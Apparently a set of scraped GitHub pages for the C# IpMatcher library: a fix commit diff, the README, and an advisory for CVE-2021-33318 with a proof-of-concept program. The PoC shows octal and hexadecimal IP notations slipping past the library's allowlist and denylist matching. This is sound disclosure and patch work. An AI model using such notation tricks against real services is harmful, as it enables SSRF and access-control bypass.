|  |  | <Authors>Joel Christner</Authors> |
|  |  | <Description>Library for maintaining a match list of IP addresses and networks and comparing inputs to see if a match exists.</Description> |
|  |  | <Copyright>(c)2021 Joel Christner</Copyright> |
|  |  | <PackageProjectUrl>https://github.com/jchristn/ipmatcher</PackageProjectUrl> |
|  |  | <RepositoryUrl>https://github.com/jchristn/ipmatcher</RepositoryUrl> |
|  |  | <RepositoryType>Github</RepositoryType> |
|  |  | <PackageLicenseUrl></PackageLicenseUrl> |
|  |  | <PackageReleaseNotes>XML documentation</PackageReleaseNotes> |
|  |  | <PackageReleaseNotes>Fix for SICK-2021-060</PackageReleaseNotes> |
|  |  | <PackageTags>ip address match netmask network mask subnet cidr</PackageTags> |
|  |  | <PackageLicenseFile>LICENSE.md</PackageLicenseFile> |
|  |  | </PropertyGroup> |
|  |  |  |
|  |  | <PropertyGroup Condition="'$(Configuration)|$(TargetFramework)|$(Platform)'=='Release|netstandard2.0|AnyCPU'"> |
|  |  | <DocumentationFile>C:\Code\Misc\IpMatcher\IpMatcher\IpMatcher.xml</DocumentationFile> |
|  |  | <DocumentationFile>IpMatcher.xml</DocumentationFile> |
|  |  | </PropertyGroup> |
|  |  |  |
|  |  | <PropertyGroup Condition="'$(Configuration)|$(TargetFramework)|$(Platform)'=='Debug|netstandard2.0|AnyCPU'"> |
|  |  | <DocumentationFile>IpMatcher.xml</DocumentationFile> |
|  |  | </PropertyGroup> |
|  |  |  |
|  |  | <ItemGroup> |
| Expand Down | |  |

11 changes: 11 additions & 0 deletions

11
[IpMatcher/IpMatcher.xml](#diff-a3644734fd78907677cfa4db18592acb8b783b6a20e47d095e27817f4c7b5b8c "IpMatcher/IpMatcher.xml")

Show comments

[View file](/jchristn/IpMatcher/blob/81d77c2f33aa912dbd032b34b9e184fc6e041d89/IpMatcher/IpMatcher.xml)
Edit file

Delete file

Load diff

Some generated files are not rendered by default. Learn more about [how customized files appear on GitHub](https://docs.github.com/github/administering-a-repository/customizing-how-changed-files-appear-on-github).

Oops, something went wrong.

Retry

10 changes: 10 additions & 0 deletions

10
[IpMatcher/Matcher.cs](#diff-403346089db89dfb97e1cb61d3514681ec1d37af374676a29126583e136bb173 "IpMatcher/Matcher.cs")

Show comments

[View file](/jchristn/IpMatcher/blob/81d77c2f33aa912dbd032b34b9e184fc6e041d89/IpMatcher/Matcher.cs)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -59,6 +59,9 @@ public void Add(string ip, string netmask) |
|  |  | if (String.IsNullOrEmpty(ip)) throw new ArgumentNullException(nameof(ip)); |
|  |  | if (String.IsNullOrEmpty(netmask)) throw new ArgumentNullException(nameof(netmask)); |
|  |  |  |
|  |  | ip = IPAddress.Parse(ip).ToString(); |
|  |  | netmask = IPAddress.Parse(netmask).ToString(); |
|  |  |  |
|  |  | string baseAddress = GetBaseIpAddress(ip, netmask); |
|  |  | IPAddress parsed = IPAddress.Parse(baseAddress); |
|  |  | if (Exists(baseAddress, netmask)) return; |
| Expand All | | @@ -83,6 +86,9 @@ public bool Exists(string ip, string netmask) |
|  |  | if (String.IsNullOrEmpty(ip)) throw new ArgumentNullException(nameof(ip)); |
|  |  | if (String.IsNullOrEmpty(netmask)) throw new ArgumentNullException(nameof(netmask)); |
|  |  |  |
|  |  | ip = IPAddress.Parse(ip).ToString(); |
|  |  | netmask = IPAddress.Parse(netmask).ToString(); |
|  |  |  |
|  |  | lock (\_CacheLock) |
|  |  | { |
|  |  | if (\_Cache.ContainsKey(ip)) |
| Expand Down  Expand Up | | @@ -116,6 +122,8 @@ public void Remove(string ip) |
|  |  | { |
|  |  | if (String.IsNullOrEmpty(ip)) throw new ArgumentNullException(nameof(ip)); |
|  |  |  |
|  |  | ip = IPAddress.Parse(ip).ToString(); |
|  |  |  |
|  |  | lock (\_CacheLock) |
|  |  | { |
|  |  | \_Cache = \_Cache.Where(d => !d.Key.Equals(ip)).ToDictionary(d => d.Key, d => d.Value); |
| Expand All | | @@ -140,6 +148,8 @@ public bool MatchExists(string ip) |
|  |  | { |
|  |  | if (String.IsNullOrEmpty(ip)) throw new ArgumentNullException(nameof(ip)); |
|  |  |  |
|  |  | ip = IPAddress.Parse(ip).ToString(); |
|  |  |  |
|  |  | IPAddress parsed = IPAddress.Parse(ip); |
|  |  |  |
|  |  | lock (\_CacheLock) |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `81d77c2`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjchristn%2FIpMatcher%2Fcommit%2F81d77c2f33aa912dbd032b34b9e184fc6e041d89) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_a3aa4839_20250108_125159.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjchristn%2FIpMatcher)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjchristn%2FIpMatcher)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=jchristn%2FIpMatcher)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[jchristn](/jchristn)
/
**[IpMatcher](/jchristn/IpMatcher)**
Public

* [Notifications](/login?return_to=%2Fjchristn%2FIpMatcher) You must be signed in to change notification settings
* [Fork
  4](/login?return_to=%2Fjchristn%2FIpMatcher)
* [Star
   15](/login?return_to=%2Fjchristn%2FIpMatcher)

C# library for maintaining a match list of IP addresses and networks and comparing inputs to see if a match exists.

### License

[MIT license](/jchristn/IpMatcher/blob/master/LICENSE.md)

[15
stars](/jchristn/IpMatcher/stargazers) [4
forks](/jchristn/IpMatcher/forks) [Branches](/jchristn/IpMatcher/branches) [Tags](/jchristn/IpMatcher/tags) [Activity](/jchristn/IpMatcher/activity)
 [Star](/login?return_to=%2Fjchristn%2FIpMatcher)

 [Notifications](/login?return_to=%2Fjchristn%2FIpMatcher) You must be signed in to change notification settings

* [Code](/jchristn/IpMatcher)
* [Issues
  0](/jchristn/IpMatcher/issues)
* [Pull requests
  0](/jchristn/IpMatcher/pulls)
* [Actions](/jchristn/IpMatcher/actions)
* [Projects
  0](/jchristn/IpMatcher/projects)
* [Security](/jchristn/IpMatcher/security)
* [Insights](/jchristn/IpMatcher/pulse)

Additional navigation options

* [Code](/jchristn/IpMatcher)
* [Issues](/jchristn/IpMatcher/issues)
* [Pull requests](/jchristn/IpMatcher/pulls)
* [Actions](/jchristn/IpMatcher/actions)
* [Projects](/jchristn/IpMatcher/projects)
* [Security](/jchristn/IpMatcher/security)
* [Insights](/jchristn/IpMatcher/pulse)

# jchristn/IpMatcher

    master[Branches](/jchristn/IpMatcher/branches)[Tags](/jchristn/IpMatcher/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[15 Commits](/jchristn/IpMatcher/commits/master/) | | |
| [.github](/jchristn/IpMatcher/tree/master/.github ".github") | | [.github](/jchristn/IpMatcher/tree/master/.github ".github") |  |  |
| [assets](/jchristn/IpMatcher/tree/master/assets "assets") | | [assets](/jchristn/IpMatcher/tree/master/assets "assets") |  |  |
| [src](/jchristn/IpMatcher/tree/master/src "src") | | [src](/jchristn/IpMatcher/tree/master/src "src") |  |  |
| [.gitignore](/jchristn/IpMatcher/blob/master/.gitignore ".gitignore") | | [.gitignore](/jchristn/IpMatcher/blob/master/.gitignore ".gitignore") |  |  |
| [CHANGELOG.md](/jchristn/IpMatcher/blob/master/CHANGELOG.md "CHANGELOG.md") | | [CHANGELOG.md](/jchristn/IpMatcher/blob/master/CHANGELOG.md "CHANGELOG.md") |  |  |
| [CODE\_OF\_CONDUCT.md](/jchristn/IpMatcher/blob/master/CODE_OF_CONDUCT.md "CODE_OF_CONDUCT.md") | | [CODE\_OF\_CONDUCT.md](/jchristn/IpMatcher/blob/master/CODE_OF_CONDUCT.md "CODE_OF_CONDUCT.md") |  |  |
| [CONTRIBUTING.md](/jchristn/IpMatcher/blob/master/CONTRIBUTING.md "CONTRIBUTING.md") | | [CONTRIBUTING.md](/jchristn/IpMatcher/blob/master/CONTRIBUTING.md "CONTRIBUTING.md") |  |  |
| [DONATIONS.md](/jchristn/IpMatcher/blob/master/DONATIONS.md "DONATIONS.md") | | [DONATIONS.md](/jchristn/IpMatcher/blob/master/DONATIONS.md "DONATIONS.md") |  |  |
| [LICENSE.md](/jchristn/IpMatcher/blob/master/LICENSE.md "LICENSE.md") | | [LICENSE.md](/jchristn/IpMatcher/blob/master/LICENSE.md "LICENSE.md") |  |  |
| [README.md](/jchristn/IpMatcher/blob/master/README.md "README.md") | | [README.md](/jchristn/IpMatcher/blob/master/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
* Code of conduct
* MIT license
# IpMatcher

[![NuGet Version](https://camo.githubusercontent.com/35c9ec8fd3e88ce5fe74e3bd24060cb0e1e25e98738c818233a8b2b56bfe4d11/68747470733a2f2f696d672e736869656c64732e696f2f6e756765742f762f49704d6174636865722e7376673f7374796c653d666c6174)](https://www.nuget.org/packages/IpMatcher/) [![NuGet](https://camo.githubusercontent.com/6cc9fbeb8fa95f9172fef6402a99889f30fb07c2f611e7f543c7378389da87e9/68747470733a2f2f696d672e736869656c64732e696f2f6e756765742f64742f49704d6174636865722e737667)](https://www.nuget.org/packages/IpMatcher)

C# library for maintaining a match list of IP addresses and networks and comparing inputs to see if a match exists.

Effective v1.0.1, IpMatcher targets .NET Core 2.0 and .NET Framework 4.5.2.

## Help and Contribution

Please file an issue for any bugs you encounter or requested features. Want to contribute? Please create a branch, commit, and submit a pull request!

## Usage

```
using IpMatcher;

Matcher matcher = new Matcher();
matcher.Add("192.168.1.0", "255.255.255.0");
matcher.Add("192.168.2.0", "255.255.255.0");
matcher.Remove("192.168.2.0");
matcher.Exists("192.168.1.0", "255.255.255.0");  // true
matcher.Match("192.168.1.34"); // true
matcher.Match("10.10.10.10");  // false
```

## Implementation

The matcher uses two primary internal objects. The first is a Dictionary which acts as a faster cache. Success responses to `Match` will update this Dictionary. On `Match` requests, the Dictionary is checked first for a match. Behind the Dictionary cache, a list of `Address` objects are stored.

## Helpful Link

A lot of the internal matching code was adapted from: <https://social.msdn.microsoft.com/Forums/en-US/c0ecc0de-b45e-4ca4-8d57-fc9babd4c221/evaluate-if-ip-address-is-part-of-a-subnet?forum=netfxnetcom>

## Version History

Refer to CHANGELOG.md

## About

C# library for maintaining a match list of IP addresses and networks and comparing inputs to see if a match exists.

### Topics

[nuget](/topics/nuget "Topic: nuget")
[matching](/topics/matching "Topic: matching")
[address](/topics/address "Topic: address")
[ipv4](/topics/ipv4 "Topic: ipv4")
[ip](/topics/ip "Topic: ip")

### Resources

[Readme](#readme-ov-file)
### License

[MIT license](#MIT-1-ov-file)
### Code of conduct

[Code of conduct](#coc-ov-file)

[Activity](/jchristn/IpMatcher/activity)
### Stars

[**15**
stars](/jchristn/IpMatcher/stargazers)
### Watchers

[**3**
watching](/jchristn/IpMatcher/watchers)
### Forks

[**4**
forks](/jchristn/IpMatcher/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fjchristn%2FIpMatcher&report=jchristn+%28user%29)

## [Releases 1](/jchristn/IpMatcher/releases)

[1.0.1
Latest

Jul 4, 2019](/jchristn/IpMatcher/releases/tag/1.0.1)

## Sponsor this project

* <https://paypal.me/joelchristner>

[Learn more about GitHub Sponsors](/sponsors)

## [Packages 0](/users/jchristn/packages?repo_name=IpMatcher)

## Languages

* [C#
  100.0%](/jchristn/IpMatcher/search?l=c%23)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_45f13066_20250108_125201.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fkaoudis%2Fadvisories%2Fblob%2Fmain%2F0-2021.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fkaoudis%2Fadvisories%2Fblob%2Fmain%2F0-2021.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=kaoudis%2Fadvisories)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[kaoudis](/kaoudis)
/
**[advisories](/kaoudis/advisories)**
Public

* [Notifications](/login?return_to=%2Fkaoudis%2Fadvisories) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Fkaoudis%2Fadvisories)
* [Star
   0](/login?return_to=%2Fkaoudis%2Fadvisories)

* [Code](/kaoudis/advisories)
* [Issues
  0](/kaoudis/advisories/issues)
* [Pull requests
  0](/kaoudis/advisories/pulls)
* [Actions](/kaoudis/advisories/actions)
* [Projects
  0](/kaoudis/advisories/projects)
* [Security](/kaoudis/advisories/security)
* [Insights](/kaoudis/advisories/pulse)

Additional navigation options

* [Code](/kaoudis/advisories)
* [Issues](/kaoudis/advisories/issues)
* [Pull requests](/kaoudis/advisories/pulls)
* [Actions](/kaoudis/advisories/actions)
* [Projects](/kaoudis/advisories/projects)
* [Security](/kaoudis/advisories/security)
* [Insights](/kaoudis/advisories/pulse)

## Files

 main
## Breadcrumbs

1. [advisories](/kaoudis/advisories/tree/main)
/
# 0-2021.md

 Blame  Blame
## Latest commit

## History

[History](/kaoudis/advisories/commits/main/0-2021.md)246 lines (197 loc) · 9.61 KB main
## Breadcrumbs

1. [advisories](/kaoudis/advisories/tree/main)
/
# 0-2021.md

Top
## File metadata and controls

* Preview
* Code
* Blame

246 lines (197 loc) · 9.61 KB[Raw](https://github.com/kaoudis/advisories/raw/refs/heads/main/0-2021.md)
# Title

.NET C# package IpMatcher incorrectly validates input, leading to indeterminate SSRF, LFI, RFI, DoS vectors

# CVE ID

CVE-2021-33318

# Internal IDs

* 0-2021
* [SICK-2021-060](https://github.com/sickcodes/security/blob/master/advisories/SICK-2021-060.md)

# Vendor

Joel Christner <https://github.com/jchristn>

# Affected product(s)

* <https://github.com/jchristn/IpMatcher>
* <https://github.com/jchristn/WatsonWebserver>
* <https://github.com/jchristn/HttpServerLite>

# Affected versions

* IpMatcher v 1.0.4.1 and below
* WatsonWebserver v 4.1.3 and below

# Vulnerability type

CWE-20 (improper input validation)

# Description

A vulnerability in the .NET C# IpMatcher v1.0.4.1 and below NuGet package allows an attacker to submit invalid octal or hexadecimal IP addresses and netmasks, since IpMatcher does not properly validate them against the internal "Matcher" match list of IP addresses and subnets. Further, IpMatcher does not correctly reformat additions to the match list when these additions (IP address or netmask or both) are supplied in octal or hexadecimal notation. A remote, unauthenticated attacker can bypass allowlist or denylist validation based on use of IpMatcher as exemplified by WatsonWebserver, resulting in indeterminate SSRF, LFI, RFI, or DoS.

# Response

Patched (researchers notified 19 August) in [commit](https://github.com/jchristn/IpMatcher/commit/81d77c2f33aa912dbd032b34b9e184fc6e041d89) and NuGet package version [1.0.4.2](https://www.nuget.org/packages/IpMatcher/1.0.4.2)

# Timeline

* **6 May 2021**: vulnerability discovered
* **11 May 2021**: CVE requested, vendor notified
* **12 May 2021**: Vendor agrees to validate and fix
* **6 July 2021**: 90 days since discovery reached
* **19 August 2021**: vendor notifies researchers of patch
* **26 August 2021**: advisory published
* **24 March 2022**: CVE-2021-33318 reserved
* **15 May 2022**: vendor notified

# Researchers

* *Harold Hunt* <https://github.com/huntharo>
* *Kelly Kaoudis* <https://github.com/kaoudis> || <https://twitter.com/kaoudis>
* *John Jackson* <https://twitter.com/johnjhacking>
* *Sick Codes* <https://github.com/sickcodes> || <https://twitter.com/sickcodes>
* *Victor Viale* <https://github.com/koroeskohr> || <https://twitter.com/koroeskohr>
* *Nick Sahler* <https://github.com/nicksahler> || <https://twitter.com/tensor_bodega>
* *Cheng Xu* <https://github.com/xu-cheng>

# Proof of Concept

This is [also available on PacketStorm](https://packetstormsecurity.com/files/167178/ipmatcher1041-ssrf.txt).

```
/* Author: Kelly Kaoudis
 * License: GPLv3
 *
 * Requires:
 * `dotnet add package IpMatcher --version 1.0.4.1`
 *
 * To run:
 * `dotnet run`
 */

using System;
using IpMatcher;

namespace dotnet
{
    class PoC
    {
        private static void checkExists(Matcher matcher, string ip, string mask)
        {
            if (matcher.Exists(ip, mask))
            {
                Console.WriteLine("matches on " + ip + " / " + mask);
            }
            else
            {
                Console.WriteLine("DOES NOT match on " + ip + " / " + mask);
            }
        }

        private static void checkMatchExists(Matcher matcher, string ip)
        {
            if (matcher.MatchExists(ip))
            {
                Console.WriteLine("matches on " + ip);
            }
            else
            {
                Console.WriteLine("DOES NOT match on " + ip);
            }

        }

        private static void dumpMatcher(Matcher matcher)
        {
            Console.WriteLine("\nWhat is actually in the matcher now (if nothing follows on the next line, nothing)?");
            foreach (string addr in matcher.All())
            {
                Console.WriteLine("address from matcher: " + addr);
            }
            Console.WriteLine("");
        }

        static void Main(string[] args)
        {
            Console.WriteLine("Constructing a new IpMatcher#Matcher...");
            Matcher matcher = new Matcher();
            // nothing in the matcher yet
            dumpMatcher(matcher);

            Console.WriteLine("adding 192.31.196.0 / 0.0.0.0 (mask)");
            matcher.Add("192.31.196.0", "0.0.0.0");

            // contains 0.0.0.0 / 0.0.0.0 (incorrect)
            dumpMatcher(matcher);

            checkExists(matcher, "192.31.196.2", "0.0.0.0");
            checkExists(matcher, "192.31.196.1", "0.0.0.0");
            checkExists(matcher, "192.31.196.0", "0.0.0.0"); // should match but does not
            checkExists(matcher, "0.0.0.0", "255.0.0.0"); //should not match
            checkExists(matcher, "0.0.0.0", "0.0.0.0");

            checkMatchExists(matcher, "0.0.0.0");
            checkMatchExists(matcher, "192.31.196.0");
            checkMatchExists(matcher, "192.31.196.1");
            //checkMatchExists(matcher, "0192.031.0196.0"); throws parse exception and not sure why
            checkMatchExists(matcher, "0300.037.0304.0"); // octal for 192.31.196.0
            checkMatchExists(matcher, "0300.037.0304.01");
            checkMatchExists(matcher, "0300.036.0304.0"); // should not match but does
            checkMatchExists(matcher, "0100.0100.0100.0100"); // should not match but does

        //    checkMatchExists(matcher, "aaaaaaaaaa"); thankfully results in exception

            // results in invalid argument exception
           // if (matcher.MatchExists("0192.031.0196.02"))
           // {
           //     Console.WriteLine("gross! matches 0192.031.0196.02");
           // }

            Console.WriteLine("adding 192.168.0.0 / 255.0.0.0 (mask)");
            matcher.Add("192.168.0.0", "255.0.0.0");

            checkExists(matcher, "192.167.0.1", "255.0.0.0");
            checkExists(matcher, "192.168.0.0", "255.0.0.0");
            checkExists(matcher, "192.168.1.1", "255.0.0.0");
            checkMatchExists(matcher, "172.13.2.15");
            checkMatchExists(matcher, "010.1.1.1");
            checkMatchExists(matcher, "4.4.4.4");

            Console.WriteLine("adding 0300.055.0250.0 / 1.1.0.0 (mask)");
            matcher.Add("0300.055.0250.0", "1.1.0.0");

            checkExists(matcher, "192.45.168.0", "1.1.0.0");
            checkExists(matcher, "0300.055.0250.0", "0.0.0.0");
            checkExists(matcher, "0300.055.0250.0300", "1.1.0.0");
            checkExists(matcher, "0288.055.0250.0", "1.1.0.0");

            checkMatchExists(matcher, "2130706433");
            checkMatchExists(matcher, "017700000001");
            checkMatchExists(matcher, "3232235521");
            checkMatchExists(matcher, "3232235777");
            checkMatchExists(matcher, "0x7f.0x00.0x00.0x01");
            checkMatchExists(matcher, "0xc0.0xa8.0x00.0x14");

            Console.WriteLine("adding 0300.055.0250.0 / 0377.0.0.0 (mask)");
            matcher.Add("0300.055.0250.0", "0377.0.0.0");

            Console.WriteLine("adding 0250.0300.010.010 / 0.0.0.0 (mask)");
            matcher.Add("0250.0300.010.010", "0.0.0.0");

            Console.WriteLine("adding 0250.0300.010.010 / 010.010.010.0 (mask)");
            matcher.Add("0250.0300.010.010", "010.010.010.0");

            // anything ending in 8 or 9 doesn't work
            Console.WriteLine("adding 0172.057.0.0 / 0.0.0.0 (mask)");
            matcher.Add("0172.057.0.0", "0.0.0.0");

            Console.WriteLine("adding 0172.057.0.0 / 055.055.013.0 (mask)");
            matcher.Add("0172.057.0.0", "055.055.013.0");

         //   matcher.Add("08.09.0.0", "01.01.01.0"); fails as it should

            Console.WriteLine("adding 010.010.0172.0 / 0.0.0.0 (mask)");
            matcher.Add("010.010.0172.0", "0.0.0.0");

            Console.WriteLine("adding 010.010.0172.0 / 01.01.01.01 (mask)");
            matcher.Add("010.010.0172.0", "01.01.01.01");

            Console.WriteLine("adding 010.010.0172.0 / 010.010.0172.010 (mask)");
            matcher.Add("010.010.0172.0", "010.010.0172.010");

            Console.WriteLine("adding 010.010.0172.0 / 010.010.0.010 (mask)");
            matcher.Add("010.010.0172.0", "010.010.0.010");

            Console.WriteLine("adding 010.010.0172.0 / 010.010.0.010 (mask)");
            matcher.Add("010.010.0172.0", "010.010.0255.010");

            Console.WriteLine("adding 0xaa.0xaa.0xaa.0xaa / 0xaa.0xfe.0xfe.0xfe (mask)");
            matcher.Add("0xaa.0xaa.0xaa.0xaa", "0xfe.0xfe.0xfe.0xfe");

          //  fails with exception as it should as 0xfff is tooooo biggggg
          //  matcher.Add("0xfff.0xfff.0xfff.0x0", "0x0.0x0.0x0.0x0");

            Console.WriteLine("adding 0xf0.0x0.0x0.0x0 / 0xff.0x0.0x0.0x0 (mask)");
            matcher.Add("0xf0.0x0.0x0.0x0", "0xff.0x0.0x0.0x0");

            // now contains the following:
            // 0.0.0.0/0.0.0.0
            // 192.0.0.0/255.0.0.0
            // 0.1.0.0/1.1.0.0
            // 192.0.0.0/0377.0.0.0
            // 8.0.8.0/010.010.010.0
            // 40.45.0.0/055.055.013.0
            // 8.8.122.0/010.010.0172.010
            // 8.8.0.0/010.010.0.010
            // 8.8.40.0/010.010.0255.010
            // 170.170.170.170/0xfe.0xfe.0xfe.0xfe
            // 240.0.0.0/0xff.0x0.0x0.0x0
            dumpMatcher(matcher);
        }
    }
}

```

# References

## Mitre CVE links

* <https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-33318>
* <https://nvd.nist.gov/vuln/detail/CVE-2021-33318>

## Project links

* <https://github.com/jchristn/IpMatcher>
* <https://github.com/jchristn/WatsonWebserver>

## Related

* <https://github.com/sickcodes/security/blob/master/advisories/SICK-2021-060.md>
* [DEF CON 29 talk](https://www.youtube.com/watch?v=_o1RPJAe4kU)
* <https://www.nuget.org/packages/IpMatcher/1.0.4.2> (fixed version)
* Fixing commit: <https://github.com/jchristn/IpMatcher/commit/81d77c2f33aa912dbd032b34b9e184fc6e041d89>
* <https://sick.codes/sick-2021-011>
* <https://sick.codes/sick-2021-014>
* <https://sick.codes/sick-2021-018>

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


